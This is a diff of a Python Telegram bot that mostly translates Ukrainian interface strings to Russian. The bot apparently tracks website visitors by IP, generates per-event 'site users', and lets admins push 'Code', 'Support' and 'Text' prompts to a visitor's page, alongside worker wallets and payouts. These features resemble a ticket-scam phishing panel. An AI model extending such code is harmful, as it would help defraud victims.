@@ -82,7 +82,7 @@ CREATE TABLE IF NOT EXISTS event_links (
 """)
 conn.commit()
 
-# --- Таблица для користувачів сайту ---
+# --- Таблица для пользователей сайта ---
 c.execute("""
 CREATE TABLE IF NOT EXISTS site_users (
     id VARCHAR(12) PRIMARY KEY,
@@ -125,13 +125,13 @@ def get_user(user_id):
         }
     return None
 
-# --- Функції для роботи з site_users ---
+# --- Функции для работы с site_users ---
 def generate_site_user_id():
-    """Генерує унікальний ID для користувача сайту"""
+    """Генерирует уникальный ID для пользователя сайта"""
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
 
 def create_site_user(dates, currency, street, price):
-    """Створює нового користувача сайту з даними події"""
+    """Создает нового пользователя сайта с данными события"""
     c = conn.cursor()
     user_id = generate_site_user_id()
     
@@ -143,7 +143,7 @@ def create_site_user(dates, currency, street, price):
     return user_id
 
 def update_site_user_ip(user_id, ip):
-    # Ігноруємо IP Telegram
+    # Игнорируем IP Telegram
     if ip.startswith('149.154.') or ip.startswith('91.108.'):
         print(f"[DEBUG] Skip Telegram IP: {ip}")
         return
@@ -160,7 +160,7 @@ def update_site_user_ip(user_id, ip):
     conn.commit()
 
 def get_site_user(user_id):
-    """Отримує дані користувача сайту"""
+    """Получает данные пользователя сайта"""
     c = conn.cursor()
     c.execute('SELECT * FROM site_users WHERE id=?', (user_id,))
     row = c.fetchone()
@@ -242,7 +242,7 @@ def ban_guard(handler):
         db_user = get_user(uid)
         if db_user and db_user['form_json'].get('banned', False):
             await message.answer(
-                "Ви заблоковані адміністратором. Причина: " + db_user['form_json'].get('ban_reason', 'Не вказана')
+                "Вы заблокированы администратором. Причина: " + db_user['form_json'].get('ban_reason', 'Не указана')
             )
             return
         return await handler(message, *args, **kwargs)
@@ -252,7 +252,7 @@ def ban_guard(handler):
 @router.message(Command("start"))
 @ban_guard
 async def cmd_start(message: types.Message):
-    print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")  # Додаємо вивід chat_id
+    print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")  # Добавляем вывод chat_id
     uid = message.from_user.id
     db_user = get_user(uid)
     if db_user:
@@ -281,7 +281,7 @@ async def cancel_any_action(message: types.Message):
     user_step[uid] = None
     user_data[uid] = {}
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+    await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
 
 @router.message(lambda m: user_step.get(m.from_user.id) == 'source')
 @ban_guard
@@ -291,7 +291,7 @@ async def process_source(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     if message.text not in ["Реклама", "От друга"]:
@@ -313,7 +313,7 @@ async def process_invited_by(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     user_data[uid]['invited_by'] = message.text
@@ -328,7 +328,7 @@ async def process_experience(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     user_data[uid]['experience'] = message.text
@@ -373,7 +373,7 @@ async def process_other(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     # Якщо користувач натиснув "Пропустить" (будь-який регістр/пробіли), не обробляємо тут
     if message.text and message.text.strip().lower() == "пропустить":
@@ -477,7 +477,7 @@ async def change_nickname_save(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     new_nick = message.text.strip()
@@ -511,7 +511,7 @@ async def change_wallet_save(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     new_wallet = message.text.strip()
@@ -542,7 +542,7 @@ async def admin_panel_action(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     if message.text == "⬅️ Назад":
@@ -581,7 +581,7 @@ async def admin_panel_action(message: types.Message):
         await message.answer("Платежка включена для всех пользователей.")
     elif message.text == "Прямая оплата":
         # Тут логіка для прямої оплати
-        await message.answer("Включено режим прямої оплати. Інструкції надіслані користувачам.")
+        await message.answer("Включено режим прямої оплати. Инструкции отправлены пользователям.")
 
     else:
         await message.answer("Неизвестная команда.")
@@ -602,7 +602,7 @@ async def admin_pay_user_profile(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     nickname = message.text.strip().lstrip('@')
@@ -665,7 +665,7 @@ async def admin_pay_amount(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     try:
@@ -730,7 +730,7 @@ async def ban_unban_username(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     username = message.text.strip().lstrip('@')
@@ -779,7 +779,7 @@ async def ban_save(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     reason = message.text.strip()
@@ -822,7 +822,7 @@ async def ban_back_handler(call: types.CallbackQuery):
 async def tickets_message(message: types.Message):
     uid = message.from_user.id
     # Спочатку видаляємо клавіатуру через не-порожнє повідомлення
-    await message.answer("Введіть дані для квитка:", reply_markup=ReplyKeyboardRemove())
+    await message.answer("Введите данные для билета:", reply_markup=ReplyKeyboardRemove())
     text = (
         "Введите данные по следующему образцу:\n"
         "└ Формат даты: 01/01/2025\n"
@@ -916,7 +916,7 @@ async def tickets_cancel_handler(call: types.CallbackQuery):
     user_step[uid] = None
     user_data[uid] = {}
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    await call.message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+    await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     await call.answer()
 
 # --- Хендлер для кнопки "Ссылки" ---
@@ -979,7 +979,7 @@ async def event_all_fields_handler(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     # Игнорируем пустые строки, обрезаем пробелы
     lines = [l.strip() for l in message.text.split('\n') if l.strip()]
@@ -1276,7 +1276,7 @@ async def payment_notify(request):
             InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
         ],
         [
-            InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{ip}"),
+            InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
             InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
         ]
     ]
@@ -1334,7 +1334,7 @@ async def tickets_cancel_handler(call: types.CallbackQuery):
     user_step[uid] = None
     user_data[uid] = {}
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    await call.message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+    await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     await call.answer()
 
 @router.callback_query(lambda c: c.data.startswith('ban:'))
@@ -1390,7 +1390,8 @@ async def admin_support_callback(call: types.CallbackQuery):
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
     import asyncio
     asyncio.create_task(set_flag())
-    await call.message.answer("Кнопка підтримки з'явиться на сайті користувача.")
+    await call.message.answer("Введите текст для пользователя:")
+    user_step[call.from_user.id] = f"text_for_{ip}"
 
 @router.callback_query(lambda c: c.data.startswith('text:'))
 @log_function
@@ -1413,7 +1414,7 @@ async def manual_payment_amount(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Дія скасована. Ви повернуті у головне меню.', reply_markup=kb)
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     parts = text.split()
     if len(parts) < 2:
